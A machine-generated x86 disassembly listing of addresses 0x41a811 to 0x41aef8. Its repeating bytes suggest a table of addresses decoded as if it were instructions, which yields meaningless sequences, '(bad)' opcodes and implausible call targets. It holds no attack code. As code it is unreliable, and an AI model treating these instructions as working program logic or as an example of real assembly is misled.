  41a811:	add    BYTE PTR [eax-0x7bffbe1f],al
  41a817:	loope  0x41a85a
  41a819:	add    BYTE PTR [eax-0x77ffbe1f],al
  41a81f:	loope  0x41a862
  41a821:	add    BYTE PTR [ecx+eiz*8-0x1e6fffbf],cl
  41a828:	inc    ecx
  41a829:	add    BYTE PTR [ecx+eiz*8-0x1e67ffbf],dl
  41a830:	inc    ecx
  41a831:	add    BYTE PTR [ecx+eiz*8],al
  41a834:	inc    ecx
  41a835:	add    BYTE PTR [ecx+eiz*8-0x1e5fffbf],bl
  41a83c:	inc    ecx
  41a83d:	add    BYTE PTR [ecx+eiz*8-0x1e57ffbf],ah
  41a844:	inc    ecx
  41a845:	add    BYTE PTR [eax-0x53ffbe20],dh
  41a84b:	loope  0x41a88e
  41a84d:	add    BYTE PTR [ecx+eiz*8+0x41],dl
  41a851:	add    BYTE PTR [eax-0x4fffbe20],bh
  41a857:	loope  0x41a89a
  41a859:	add    BYTE PTR [ecx+eiz*8-0x1e47ffbf],dh
  41a860:	inc    ecx
  41a861:	add    BYTE PTR [ecx+eiz*8-0x1e3fffbf],bh
  41a868:	inc    ecx
  41a869:	add    ah,al
  41a86b:	loope  0x41a8ae
  41a86d:	add    BYTE PTR [ecx+eiz*8],bh
  41a870:	inc    ecx
  41a871:	add    al,cl
  41a873:	loope  0x41a8b6
  41a875:	add    ah,cl
  41a877:	loope  0x41a8ba
  41a879:	add    al,dl
  41a87b:	loope  0x41a8be
  41a87d:	add    BYTE PTR [eax-0x2bffbe1f],dh
  41a883:	loope  0x41a8c6
  41a885:	add    al,bl
  41a887:	loope  0x41a8ca
  41a889:	add    BYTE PTR [ecx+eiz*8-0x1ed7ffbf],ch
  41a890:	inc    ecx
  41a891:	add    BYTE PTR [eax-0x23ffbe1f],ah
  41a897:	loope  0x41a8da
  41a899:	add    al,ah
  41a89b:	loope  0x41a8de
  41a89d:	add    ah,ah
  41a89f:	loope  0x41a8e2
  41a8a1:	add    al,ch
  41a8a3:	loope  0x41a8e6
  41a8a5:	add    ah,ch
  41a8a7:	loope  0x41a8ea
  41a8a9:	add    al,dh
  41a8ab:	loope  0x41a8ee
  41a8ad:	add    ah,dh
  41a8af:	loope  0x41a8f2
  41a8b1:	add    al,bh
  41a8b3:	loope  0x41a8f6
  41a8b5:	add    ah,bh
  41a8b7:	loope  0x41a8fa
  41a8b9:	add    BYTE PTR [eax],al
  41a8bb:	loop   0x41a8fe
  41a8bd:	add    BYTE PTR [eax-0x4bffbe20],bh
  41a8c3:	loope  0x41a906
  41a8c5:	add    al,cl
  41a8c7:	loope  0x41a90a
  41a8c9:	add    BYTE PTR [edx+eiz*8],al
  41a8cc:	inc    ecx
  41a8cd:	add    BYTE PTR [eax],cl
  41a8cf:	loop   0x41a912
  41a8d1:	add    BYTE PTR [edx+eiz*8],cl
  41a8d4:	inc    ecx
  41a8d5:	add    BYTE PTR [eax],dl
  41a8d7:	loop   0x41a91a
  41a8d9:	add    BYTE PTR [edx+eiz*8],dl
  41a8dc:	inc    ecx
  41a8dd:	add    BYTE PTR [eax],bl
  41a8df:	loop   0x41a922
  41a8e1:	add    BYTE PTR [ecx+eiz*8],dh
  41a8e4:	inc    ecx
  41a8e5:	add    BYTE PTR [edx+eiz*8],bl
  41a8e8:	inc    ecx
  41a8e9:	add    BYTE PTR [eax],ah
  41a8eb:	loop   0x41a92e
  41a8ed:	add    BYTE PTR [edx+eiz*8],ah
  41a8f0:	inc    ecx
  41a8f1:	add    BYTE PTR [eax],ch
  41a8f3:	loop   0x41a936
  41a8f5:	add    BYTE PTR [edx+eiz*8],ch
  41a8f8:	inc    ecx
  41a8f9:	add    BYTE PTR [eax],dh
  41a8fb:	loop   0x41a93e
  41a8fd:	add    BYTE PTR [edx+eiz*8],dh
  41a900:	inc    ecx
  41a901:	add    ah,cl
  41a903:	loopne 0x41a946
  41a905:	add    ah,ch
  41a907:	loopne 0x41a94a
  41a909:	add    al,ch
  41a90b:	loope  0x41a94e
  41a90d:	add    BYTE PTR [eax],bh
  41a90f:	loop   0x41a952
  41a911:	add    BYTE PTR [edx+eiz*8],bh
  41a914:	inc    ecx
  41a915:	add    BYTE PTR [eax-0x1e],al
  41a918:	inc    ecx
  41a919:	add    BYTE PTR [edx+eiz*8],al
  41a91c:	inc    ecx
  41a91d:	add    BYTE PTR [edx+eiz*8+0x41],al
  41a921:	add    BYTE PTR [eax-0x1e],cl
  41a924:	inc    ecx
  41a925:	add    BYTE PTR [edx+eiz*8+0x41],cl
  41a929:	add    ah,ah
  41a92b:	loope  0x41a96e
  41a92d:	add    BYTE PTR [eax-0x1e],dl
  41a930:	inc    ecx
  41a931:	add    BYTE PTR [edx+eiz*8+0x41],dl
  41a935:	add    BYTE PTR [eax-0x1e],bl
  41a938:	inc    ecx
  41a939:	add    BYTE PTR [edx+eiz*8+0x41],bl
  41a93d:	add    BYTE PTR [eax-0x1e],ah
  41a940:	inc    ecx
  41a941:	add    ah,ah
  41a943:	loopne 0x41a986
  41a945:	add    BYTE PTR [edx+eiz*8+0x41],ah
  41a949:	add    BYTE PTR [eax+0x40041e0],bh
  41a94f:	loope  0x41a992
  41a951:	add    BYTE PTR [eax-0x1e],ch
  41a954:	inc    ecx
  41a955:	add    ah,cl
  41a957:	loope  0x41a99a
  41a959:	add    BYTE PTR [eax-0xbffbe20],dh
  41a95f:	loope  0x41a9a2
  41a961:	add    BYTE PTR [ecx+eiz*8],bh
  41a964:	inc    ecx
  41a965:	add    BYTE PTR [edx+eiz*8+0x41],ch
  41a969:	add    BYTE PTR [eax-0x1e],dh
  41a96c:	inc    ecx
  41a96d:	add    BYTE PTR [edx+eiz*8+0x41],dh
  41a971:	add    BYTE PTR [eax-0x1f],dh
  41a974:	inc    ecx
  41a975:	add    BYTE PTR [eax],ah
  41a977:	loop   0x41a9ba
  41a979:	add    BYTE PTR [eax-0x1e],bh
  41a97c:	inc    ecx
  41a97d:	add    BYTE PTR [edx+eiz*8+0x41],bh
  41a981:	add    BYTE PTR [eax+0x280041e2],al
  41a987:	loop   0x41a9ca
  41a989:	add    BYTE PTR [edx+eiz*8-0x1e4fffbf],al
  41a990:	inc    ecx
  41a991:	add    BYTE PTR [eax],bl
  41a993:	loope  0x41a9d6
  41a995:	add    ah,al
  41a997:	loopne 0x41a9da
  41a999:	add    BYTE PTR [eax-0x73ffbe1e],cl
  41a99f:	loop   0x41a9e2
  41a9a1:	add    BYTE PTR [eax-0x6bffbe1e],dl
  41a9a7:	loop   0x41a9ea
  41a9a9:	add    BYTE PTR [eax-0x63ffbe1e],bl
  41a9af:	loop   0x41a9f2
  41a9b1:	add    BYTE PTR [eax+0x4c0041e2],ah
  41a9b7:	loop   0x41a9fa
  41a9b9:	add    BYTE PTR [ecx+eiz*8],ch
  41a9bc:	inc    ecx
  41a9bd:	add    BYTE PTR [edx+eiz*8-0x1d57ffbf],ah
  41a9c4:	inc    ecx
  41a9c5:	add    ah,cl
  41a9c7:	loopne 0x41aa0a
  41a9c9:	add    BYTE PTR [edx+eiz*8-0x1d53ffbf],al
  41a9d0:	inc    ecx
  41a9d1:	add    BYTE PTR [eax-0x23ffbe1e],dh
  41a9d7:	loopne 0x41aa1a
  41a9d9:	add    BYTE PTR [edx+eiz*8-0x1e57ffbf],dh
  41a9e0:	inc    ecx
  41a9e1:	add    BYTE PTR [eax-0x47ffbe1f],dh
  41a9e7:	loop   0x41aa2a
  41a9e9:	add    BYTE PTR [eax],ah
  41a9eb:	loop   0x41aa2e
  41a9ed:	add    al,al
  41a9ef:	loope  0x41aa32
  41a9f1:	add    ah,ch
  41a9f3:	loope  0x41aa36
  41a9f5:	add    BYTE PTR [eax],bl
  41a9f7:	loope  0x41aa3a
  41a9f9:	add    BYTE PTR [edx+eiz*8+0x41],dh
  41a9fd:	add    BYTE PTR [ecx+eiz*8+0x41],dh
  41aa01:	add    BYTE PTR [edx+eiz*8-0x1d87ffbf],bh
  41aa08:	inc    ecx
  41aa09:	add    al,al
  41aa0b:	loop   0x41aa4e
  41aa0d:	add    ah,al
  41aa0f:	loop   0x41aa52
  41aa11:	add    BYTE PTR [eax-0x37ffbe1f],al
  41aa17:	loop   0x41aa5a
  41aa19:	add    BYTE PTR [edx+eiz*8-0x1e3fffbf],bh
  41aa20:	inc    ecx
  41aa21:	add    ah,cl
  41aa23:	loop   0x41aa66
  41aa25:	add    al,dl
  41aa27:	loop   0x41aa6a
  41aa29:	add    ah,dl
  41aa2b:	loop   0x41aa6e
  41aa2d:	add    BYTE PTR [edx+eiz*8+0x41],bl
  41aa31:	add    al,bl
  41aa33:	loop   0x41aa76
  41aa35:	add    al,dl
  41aa37:	loop   0x41aa7a
  41aa39:	add    BYTE PTR [eax],dh
  41aa3b:	loop   0x41aa7e
  41aa3d:	add    BYTE PTR [eax-0x1e],bl
  41aa40:	inc    ecx
  41aa41:	add    ah,bl
  41aa43:	loop   0x41aa86
  41aa45:	add    al,ah
  41aa47:	loop   0x41aa8a
  41aa49:	add    BYTE PTR [eax-0x1bffbe1f],dl
  41aa4f:	loop   0x41aa92
  41aa51:	add    al,ch
  41aa53:	loop   0x41aa96
  41aa55:	add    ah,ch
  41aa57:	loop   0x41aa9a
  41aa59:	add    al,dh
  41aa5b:	loop   0x41aa9e
  41aa5d:	add    ah,dh
  41aa5f:	loop   0x41aaa2
  41aa61:	add    BYTE PTR [eax-0x47ffbe1e],dl
  41aa67:	loope  0x41aaaa
  41aa69:	add    al,bh
  41aa6b:	loop   0x41aaae
  41aa6d:	add    ah,bh
  41aa6f:	loop   0x41aab2
  41aa71:	add    BYTE PTR [eax],al
  41aa73:	jecxz  0x41aab6
  41aa75:	add    BYTE PTR [ebx+eiz*8],al
  41aa78:	inc    ecx
  41aa79:	add    BYTE PTR [eax],cl
  41aa7b:	jecxz  0x41aabe
  41aa7d:	add    BYTE PTR [eax+0x280041e1],cl
  41aa83:	loop   0x41aac6
  41aa85:	add    BYTE PTR [eax-0x1e],ch
  41aa88:	inc    ecx
  41aa89:	add    BYTE PTR [edx+eiz*8+0x41],bh
  41aa8d:	add    ah,ah
  41aa8f:	loopne 0x41aad2
  41aa91:	add    BYTE PTR [eax-0x1e],ah
  41aa94:	inc    ecx
  41aa95:	add    BYTE PTR [ebx+eiz*8],cl
  41aa98:	inc    ecx
  41aa99:	add    BYTE PTR [eax],dl
  41aa9b:	jecxz  0x41aade
  41aa9d:	add    BYTE PTR [ebx+eiz*8],dl
  41aaa0:	inc    ecx
  41aaa1:	add    BYTE PTR [eax],ch
  41aaa3:	loope  0x41aae6
  41aaa5:	add    BYTE PTR [edx+eiz*8],ch
  41aaa8:	inc    ecx
  41aaa9:	add    BYTE PTR [eax],bl
  41aaab:	jecxz  0x41aaee
  41aaad:	add    BYTE PTR [eax-0x1f],dh
  41aab0:	inc    ecx
  41aab1:	add    BYTE PTR [ecx+eiz*8-0x1f47ffbf],al
  41aab8:	inc    ecx
  41aab9:	add    BYTE PTR [ebx+eiz*8],bl
  41aabc:	inc    ecx
  41aabd:	add    al,dh
  41aabf:	loopne 0x41ab02
  41aac1:	add    BYTE PTR [eax],ah
  41aac3:	jecxz  0x41ab06
  41aac5:	add    BYTE PTR [ebx+eiz*8],ah
  41aac8:	inc    ecx
  41aac9:	add    BYTE PTR [eax],ch
  41aacb:	jecxz  0x41ab0e
  41aacd:	add    BYTE PTR [edx+eiz*8+0x41],ah
  41aad1:	add    BYTE PTR [ebx+eiz*8],ch
  41aad4:	inc    ecx
  41aad5:	add    BYTE PTR [eax],dh
  41aad7:	jecxz  0x41ab1a
  41aad9:	add    BYTE PTR [ebx+eiz*8],dh
  41aadc:	inc    ecx
  41aadd:	add    BYTE PTR [eax],bh
  41aadf:	jecxz  0x41ab22
  41aae1:	add    BYTE PTR [eax-0x1f],ch
  41aae4:	inc    ecx
  41aae5:	add    BYTE PTR [ebx+eiz*8],ch
  41aae8:	inc    ecx
  41aae9:	add    BYTE PTR [ebx+eiz*8],bh
  41aaec:	inc    ecx
  41aaed:	add    BYTE PTR [eax-0x1d],al
  41aaf0:	inc    ecx
  41aaf1:	add    BYTE PTR [ebx+eiz*8],ch
  41aaf4:	inc    ecx
  41aaf5:	add    BYTE PTR [ecx+eiz*8+0x41],ah
  41aaf9:	add    BYTE PTR [edx+eiz*8],dl
  41aafc:	inc    ecx
  41aafd:	add    BYTE PTR [edx+eiz*8-0x1e7bffbf],bl
  41ab04:	inc    ecx
  41ab05:	add    BYTE PTR [edx+eiz*8-0x1cbbffbf],ah
  41ab0c:	inc    ecx
  41ab0d:	add    BYTE PTR [eax-0x1d],cl
  41ab10:	inc    ecx
  41ab11:	add    BYTE PTR [ecx+eiz*8+0x41],al
  41ab15:	add    BYTE PTR [eax+0x4c0041e2],al
  41ab1b:	jecxz  0x41ab5e
  41ab1d:	add    ah,dh
  41ab1f:	loopne 0x41ab62
  41ab21:	add    BYTE PTR [ecx+eiz*8],bh
  41ab24:	inc    ecx
  41ab25:	add    BYTE PTR [eax-0x1e],bl
  41ab28:	inc    ecx
  41ab29:	add    BYTE PTR [eax-0x1d],dl
  41ab2c:	inc    ecx
  41ab2d:	add    BYTE PTR [ebx+eiz*8+0x41],dl
  41ab31:	add    BYTE PTR [ecx+eiz*8-0x1ca7ffbf],bl
  41ab38:	inc    ecx
  41ab39:	add    ah,dl
  41ab3b:	loopne 0x41ab7e
  41ab3d:	add    BYTE PTR [eax-0x1f],al
  41ab40:	inc    ecx
  41ab41:	add    BYTE PTR [ebx+eiz*8+0x41],bl
  41ab45:	add    BYTE PTR [edx+eiz*8],ch
  41ab48:	inc    ecx
  41ab49:	add    BYTE PTR [eax-0x1d],ah
  41ab4c:	inc    ecx
  41ab4d:	add    BYTE PTR [eax-0x1f],dl
  41ab50:	inc    ecx
  41ab51:	add    BYTE PTR [ebx+eiz*8+0x41],ah
  41ab55:	add    al,dl
  41ab57:	loopne 0x41ab9a
  41ab59:	add    BYTE PTR [eax-0x1d],ch
  41ab5c:	inc    ecx
  41ab5d:	add    BYTE PTR [eax-0x1e],dh
  41ab60:	inc    ecx
  41ab61:	add    BYTE PTR [ebx+eiz*8+0x41],ch
  41ab65:	add    BYTE PTR [eax-0x1d],dh
  41ab68:	inc    ecx
  41ab69:	add    BYTE PTR [eax-0x1f],ch
  41ab6c:	inc    ecx
  41ab6d:	add    BYTE PTR [ecx+eiz*8+0x41],bh
  41ab71:	add    al,dh
  41ab73:	loopne 0x41abb6
  41ab75:	add    BYTE PTR [ebx+eiz*8],al
  41ab78:	inc    ecx
  41ab79:	add    BYTE PTR [ecx+eiz*8+0x41],al
  41ab7d:	add    BYTE PTR [ebx+eiz*8+0x41],dh
  41ab81:	add    BYTE PTR [eax-0x1d],bh
  41ab84:	inc    ecx
  41ab85:	add    BYTE PTR [eax],bl
  41ab87:	jecxz  0x41abca
  41ab89:	add    BYTE PTR [eax+0x80041e2],ah
  41ab8f:	loop   0x41abd2
  41ab91:	add    BYTE PTR [ecx+eiz*8-0x1d17ffbf],ah
  41ab98:	inc    ecx
  41ab99:	add    BYTE PTR [edx+eiz*8],bh
  41ab9c:	inc    ecx
  41ab9d:	add    BYTE PTR [ebx+eiz*8+0x41],bh
  41aba1:	add    BYTE PTR [eax],ah
  41aba3:	jecxz  0x41abe6
  41aba5:	add    ah,dh
  41aba7:	loope  0x41abea
  41aba9:	add    BYTE PTR [ebx+eiz*8+0x41],ch
  41abad:	add    BYTE PTR [eax+0x640041e3],al
  41abb3:	loop   0x41abf6
  41abb5:	add    ah,ah
  41abb7:	loopne 0x41abfa
  41abb9:	add    BYTE PTR [edx+eiz*8],dl
  41abbc:	inc    ecx
  41abbd:	add    BYTE PTR [ebx+eiz*8-0x1c77ffbf],al
  41abc4:	inc    ecx
  41abc5:	add    BYTE PTR [eax+0x440041e1],bh
  41abcb:	jecxz  0x41ac0e
  41abcd:	add    BYTE PTR [ebx+eiz*8-0x1c6fffbf],cl
  41abd4:	inc    ecx
  41abd5:	add    BYTE PTR [eax-0x1e],ah
  41abd8:	inc    ecx
  41abd9:	add    BYTE PTR [ebx+eiz*8-0x1c67ffbf],dl
  41abe0:	inc    ecx
  41abe1:	add    BYTE PTR [eax+0x780041e2],al
  41abe7:	loope  0x41ac2a
  41abe9:	add    ah,cl
  41abeb:	fadd   QWORD PTR [ecx+0x0]
  41abee:	rcr    ah,1
  41abf0:	inc    ecx
  41abf1:	add    ah,dl
  41abf3:	fadd   QWORD PTR [ecx+0x0]
  41abf6:	fcomp  st(4)
  41abf8:	inc    ecx
  41abf9:	add    ah,bl
  41abfb:	fadd   QWORD PTR [ecx+0x0]
  41abfe:	loopne 0x41abdc
  41ac00:	inc    ecx
  41ac01:	add    ah,ah
  41ac03:	fadd   QWORD PTR [ecx+0x0]
  41ac06:	call   0xec41ede7
  41ac0b:	fadd   QWORD PTR [ecx+0x0]
  41ac0e:	lock fadd QWORD PTR [ecx+0x0]
  41ac12:	hlt    
  41ac13:	fadd   QWORD PTR [ecx+0x0]
  41ac16:	clc    
  41ac17:	fadd   QWORD PTR [ecx+0x0]
  41ac1a:	cld    
  41ac1b:	fadd   QWORD PTR [ecx+0x0]
  41ac1e:	add    ch,bl
  41ac20:	inc    ecx
  41ac21:	add    BYTE PTR [ebx*8-0x22f7ffbf],al
  41ac28:	inc    ecx
  41ac29:	add    BYTE PTR [ebx*8-0x22efffbf],cl
  41ac30:	inc    ecx
  41ac31:	add    BYTE PTR [ebx*8-0x22e7ffbf],dl
  41ac38:	inc    ecx
  41ac39:	add    BYTE PTR [ebx*8-0x22dfffbf],bl
  41ac40:	inc    ecx
  41ac41:	add    BYTE PTR [ebx*8-0x22d7ffbf],ah
  41ac48:	inc    ecx
  41ac49:	add    BYTE PTR [ebx*8-0x22cfffbf],ch
  41ac50:	inc    ecx
  41ac51:	add    BYTE PTR [ebx*8-0x22c7ffbf],dh
  41ac58:	inc    ecx
  41ac59:	add    BYTE PTR [ebx*8-0x22bfffbf],bh
  41ac60:	inc    ecx
  41ac61:	add    BYTE PTR [ebp+ebx*8+0x41],al
  41ac65:	add    BYTE PTR [eax-0x23],cl
  41ac68:	inc    ecx
  41ac69:	add    BYTE PTR [ebp+ebx*8+0x41],cl
  41ac6d:	add    BYTE PTR [eax-0x23],dl
  41ac70:	inc    ecx
  41ac71:	add    BYTE PTR [ebp+ebx*8+0x41],dl
  41ac75:	add    BYTE PTR [eax-0x23],bl
  41ac78:	inc    ecx
  41ac79:	add    BYTE PTR [ebp+ebx*8+0x41],bl
  41ac7d:	add    BYTE PTR [eax-0x23],ah
  41ac80:	inc    ecx
  41ac81:	add    BYTE PTR [ebp+ebx*8+0x41],ah
  41ac85:	add    BYTE PTR [eax-0x23],ch
  41ac88:	inc    ecx
  41ac89:	add    BYTE PTR [ebp+ebx*8+0x41],ch
  41ac8d:	add    BYTE PTR [eax-0x23],dh
  41ac90:	inc    ecx
  41ac91:	add    BYTE PTR [ebp+ebx*8+0x41],dh
  41ac95:	add    BYTE PTR [eax-0x23],bh
  41ac98:	inc    ecx
  41ac99:	add    BYTE PTR [ebp+ebx*8+0x41],bh
  41ac9d:	add    BYTE PTR [eax-0x7bffbe23],al
  41aca3:	fld    QWORD PTR [ecx+0x0]
  41aca6:	pusha  
  41aca7:	fld    QWORD PTR [ecx+0x0]
  41acaa:	mov    ch,bl
  41acac:	inc    ecx
  41acad:	add    BYTE PTR [ebp+ebx*8-0x226fffbf],cl
  41acb4:	inc    ecx
  41acb5:	add    BYTE PTR [ebp+ebx*8-0x2267ffbf],dl
  41acbc:	inc    ecx
  41acbd:	add    BYTE PTR [ebp+ebx*8+0x41],dh
  41acc1:	add    BYTE PTR [ebp+ebx*8-0x225fffbf],bl
  41acc8:	inc    ecx
  41acc9:	add    BYTE PTR [ebp+ebx*8-0x2257ffbf],ah
  41acd0:	inc    ecx
  41acd1:	add    BYTE PTR [ebp+ebx*8-0x224fffbf],ch
  41acd8:	inc    ecx
  41acd9:	add    BYTE PTR [ebp+ebx*8-0x2247ffbf],dh
  41ace0:	inc    ecx
  41ace1:	add    BYTE PTR [ebp+ebx*8-0x223fffbf],bh
  41ace8:	inc    ecx
  41ace9:	add    ah,al
  41aceb:	fld    QWORD PTR [ecx+0x0]
  41acee:	enter  0x41dd,0x0
  41acf2:	int3   
  41acf3:	fld    QWORD PTR [ecx+0x0]
  41acf6:	rcr    ch,1
  41acf8:	inc    ecx
  41acf9:	add    ah,dl
  41acfb:	fld    QWORD PTR [ecx+0x0]
  41acfe:	fcomp  st(5)
  41ad00:	inc    ecx
  41ad01:	add    ah,bl
  41ad03:	fld    QWORD PTR [ecx+0x0]
  41ad06:	loopne 0x41ace5
  41ad08:	inc    ecx
  41ad09:	add    ah,ah
  41ad0b:	fld    QWORD PTR [ecx+0x0]
  41ad0e:	call   0xec41eef0
  41ad13:	fld    QWORD PTR [ecx+0x0]
  41ad16:	lock fld QWORD PTR [ecx+0x0]
  41ad1a:	hlt    
  41ad1b:	fld    QWORD PTR [ecx+0x0]
  41ad1e:	clc    
  41ad1f:	fld    QWORD PTR [ecx+0x0]
  41ad22:	cld    
  41ad23:	fld    QWORD PTR [ecx+0x0]
  41ad26:	aam    0xdd
  41ad28:	inc    ecx
  41ad29:	add    BYTE PTR [eax],al
  41ad2b:	fiadd  WORD PTR [ecx+0x0]
  41ad2e:	call   0x441ef10
  41ad33:	fiadd  WORD PTR [ecx+0x0]
  41ad36:	pushf  
  41ad37:	fld    QWORD PTR [ecx+0x0]
  41ad3a:	or     dh,bl
  41ad3c:	inc    ecx
  41ad3d:	add    BYTE PTR [esi+ebx*8],cl
  41ad40:	inc    ecx
  41ad41:	add    BYTE PTR [eax],dl
  41ad43:	fiadd  WORD PTR [ecx+0x0]
  41ad46:	adc    al,0xde
  41ad48:	inc    ecx
  41ad49:	add    BYTE PTR [eax],bl
  41ad4b:	fiadd  WORD PTR [ecx+0x0]
  41ad4e:	sbb    al,0xde
  41ad50:	inc    ecx
  41ad51:	add    BYTE PTR [eax],ah
  41ad53:	fiadd  WORD PTR [ecx+0x0]
  41ad56:	fcomp  st(5)
  41ad58:	inc    ecx
  41ad59:	add    BYTE PTR [esi+ebx*8],ah
  41ad5c:	inc    ecx
  41ad5d:	add    BYTE PTR [eax],ch
  41ad5f:	fiadd  WORD PTR [ecx+0x0]
  41ad62:	sub    al,0xde
  41ad64:	inc    ecx
  41ad65:	add    BYTE PTR [eax],dh
  41ad67:	fiadd  WORD PTR [ecx+0x0]
  41ad6a:	xor    al,0xde
  41ad6c:	inc    ecx
  41ad6d:	add    BYTE PTR [eax],bh
  41ad6f:	fiadd  WORD PTR [ecx+0x0]
  41ad72:	cmp    al,0xde
  41ad74:	inc    ecx
  41ad75:	add    BYTE PTR [eax-0x22],al
  41ad78:	inc    ecx
  41ad79:	add    BYTE PTR [esi+ebx*8+0x41],al
  41ad7d:	add    BYTE PTR [eax-0x22],cl
  41ad80:	inc    ecx
  41ad81:	add    al,dl
  41ad83:	fld    QWORD PTR [ecx+0x0]
  41ad86:	dec    esp
  41ad87:	fiadd  WORD PTR [ecx+0x0]
  41ad8a:	push   eax
  41ad8b:	fiadd  WORD PTR [ecx+0x0]
  41ad8e:	push   esp
  41ad8f:	fiadd  WORD PTR [ecx+0x0]
  41ad92:	(bad)  
  41ad94:	inc    ecx
  41ad95:	add    BYTE PTR [eax-0x22],bl
  41ad98:	inc    ecx
  41ad99:	add    BYTE PTR [ebp+ebx*8+0x41],dh
  41ad9d:	add    BYTE PTR [eax-0x23],bh
  41ada0:	inc    ecx
  41ada1:	add    BYTE PTR [esi+ebx*8+0x41],bl
  41ada5:	add    BYTE PTR [eax-0x22],ah
  41ada8:	inc    ecx
  41ada9:	add    BYTE PTR [esi+ebx*8],dl
  41adac:	inc    ecx
  41adad:	add    BYTE PTR [esi+ebx*8+0x41],ah
  41adb1:	add    BYTE PTR [eax-0x22],ch
  41adb4:	inc    ecx
  41adb5:	add    BYTE PTR [esi+ebx*8+0x41],ch
  41adb9:	add    BYTE PTR [eax-0x22],dh
  41adbc:	inc    ecx
  41adbd:	add    BYTE PTR [esi+ebx*8+0x41],dh
  41adc1:	add    BYTE PTR [eax-0x22],dl
  41adc4:	inc    ecx
  41adc5:	add    BYTE PTR [eax-0x22],bh
  41adc8:	inc    ecx
  41adc9:	add    BYTE PTR [esi+ebx*8+0x41],bh
  41adcd:	add    BYTE PTR [eax-0x7bffbe22],al
  41add3:	fiadd  WORD PTR [ecx+0x0]
  41add6:	cmp    dh,bl
  41add8:	inc    ecx
  41add9:	add    BYTE PTR [eax-0x73ffbe22],cl
  41addf:	fiadd  WORD PTR [ecx+0x0]
  41ade2:	nop
  41ade3:	fiadd  WORD PTR [ecx+0x0]
  41ade6:	xchg   esp,eax
  41ade7:	fiadd  WORD PTR [ecx+0x0]
  41adea:	cwde   
  41adeb:	fiadd  WORD PTR [ecx+0x0]
  41adee:	pushf  
  41adef:	fiadd  WORD PTR [ecx+0x0]
  41adf2:	mov    al,ds:0xa40041de
  41adf7:	fiadd  WORD PTR [ecx+0x0]
  41adfa:	test   al,0xde
  41adfc:	inc    ecx
  41adfd:	add    BYTE PTR [esi+ebx*8],dh
  41ae00:	inc    ecx
  41ae01:	add    BYTE PTR [esi+ebx*8-0x214fffbf],ch
  41ae08:	inc    ecx
  41ae09:	add    BYTE PTR [esi+ebx*8-0x2147ffbf],dh
  41ae10:	inc    ecx
  41ae11:	add    BYTE PTR [esi+ebx*8-0x213fffbf],bh
  41ae18:	inc    ecx
  41ae19:	add    ah,al
  41ae1b:	fiadd  WORD PTR [ecx+0x0]
  41ae1e:	enter  0x41de,0x0
  41ae22:	int3   
  41ae23:	fiadd  WORD PTR [ecx+0x0]
  41ae26:	rcr    dh,1
  41ae28:	inc    ecx
  41ae29:	add    BYTE PTR [ebp+ebx*8-0x212bffbf],bl
  41ae30:	inc    ecx
  41ae31:	add    al,bl
  41ae33:	fiadd  WORD PTR [ecx+0x0]
  41ae36:	(bad)  
  41ae38:	inc    ecx
  41ae39:	add    al,ah
  41ae3b:	fiadd  WORD PTR [ecx+0x0]
  41ae3e:	in     al,0xde
  41ae40:	inc    ecx
  41ae41:	add    al,ch
  41ae43:	fiadd  WORD PTR [ecx+0x0]
  41ae46:	in     al,dx
  41ae47:	fiadd  WORD PTR [ecx+0x0]
  41ae4a:	lock fiadd WORD PTR [ecx+0x0]
  41ae4e:	in     al,0xdd
  41ae50:	inc    ecx
  41ae51:	add    ah,dh
  41ae53:	fiadd  WORD PTR [ecx+0x0]
  41ae56:	clc    
  41ae57:	fiadd  WORD PTR [ecx+0x0]
  41ae5a:	cld    
  41ae5b:	fiadd  WORD PTR [ecx+0x0]
  41ae5e:	add    bh,bl
  41ae60:	inc    ecx
  41ae61:	add    BYTE PTR [edi+ebx*8],al
  41ae64:	inc    ecx
  41ae65:	add    BYTE PTR [eax-0x22],bl
  41ae68:	inc    ecx
  41ae69:	add    BYTE PTR [eax],cl
  41ae6b:	fild   WORD PTR [ecx+0x0]
  41ae6e:	add    al,0xde
  41ae70:	inc    ecx
  41ae71:	add    BYTE PTR [edi+ebx*8],cl
  41ae74:	inc    ecx
  41ae75:	add    BYTE PTR [ebp+ebx*8+0x41],ch
  41ae79:	add    al,dl
  41ae7b:	fiadd  WORD PTR [ecx+0x0]
  41ae7e:	adc    bh,bl
  41ae80:	inc    ecx
  41ae81:	add    BYTE PTR [edi+ebx*8],dl
  41ae84:	inc    ecx
  41ae85:	add    BYTE PTR [eax],bl
  41ae87:	fild   WORD PTR [ecx+0x0]
  41ae8a:	hlt    
  41ae8b:	fadd   QWORD PTR [ecx+0x0]
  41ae8e:	sbb    al,0xdf
  41ae90:	inc    ecx
  41ae91:	add    BYTE PTR [eax],ah
  41ae93:	fild   WORD PTR [ecx+0x0]
  41ae96:	and    al,0xdf
  41ae98:	inc    ecx
  41ae99:	add    BYTE PTR [eax-0x23],cl
  41ae9c:	inc    ecx
  41ae9d:	add    BYTE PTR [eax],ch
  41ae9f:	fild   WORD PTR [ecx+0x0]
  41aea2:	sub    al,0xdf
  41aea4:	inc    ecx
  41aea5:	add    BYTE PTR [eax],dh
  41aea7:	fild   WORD PTR [ecx+0x0]
  41aeaa:	xor    al,0xdf
  41aeac:	inc    ecx
  41aead:	add    BYTE PTR [eax],bh
  41aeaf:	fild   WORD PTR [ecx+0x0]
  41aeb2:	in     al,dx
  41aeb3:	fadd   QWORD PTR [ecx+0x0]
  41aeb6:	cmp    al,0xdf
  41aeb8:	inc    ecx
  41aeb9:	add    BYTE PTR [eax-0x21],al
  41aebc:	inc    ecx
  41aebd:	add    BYTE PTR [edi+ebx*8+0x41],al
  41aec1:	add    BYTE PTR [eax-0x21],cl
  41aec4:	inc    ecx
  41aec5:	add    BYTE PTR [edi+ebx*8+0x41],cl
  41aec9:	add    BYTE PTR [eax-0x21],dl
  41aecc:	inc    ecx
  41aecd:	add    BYTE PTR [edi+ebx*8+0x41],dl
  41aed1:	add    BYTE PTR [eax-0x21],bl
  41aed4:	inc    ecx
  41aed5:	add    BYTE PTR [edi+ebx*8+0x41],bl
  41aed9:	add    BYTE PTR [eax-0x21],ah
  41aedc:	inc    ecx
  41aedd:	add    BYTE PTR [edi+ebx*8+0x41],ah
  41aee1:	add    BYTE PTR [eax-0x21],ch
  41aee4:	inc    ecx
  41aee5:	add    BYTE PTR [edi+ebx*8+0x41],ch
  41aee9:	add    BYTE PTR [eax-0x21],dh
  41aeec:	inc    ecx
  41aeed:	add    al,ah
  41aeef:	fadd   QWORD PTR [ecx+0x0]
  41aef2:	je     0x41aed3
  41aef4:	inc    ecx
  41aef5:	add    BYTE PTR [eax-0x21],bh
  41aef8:	inc    ecx
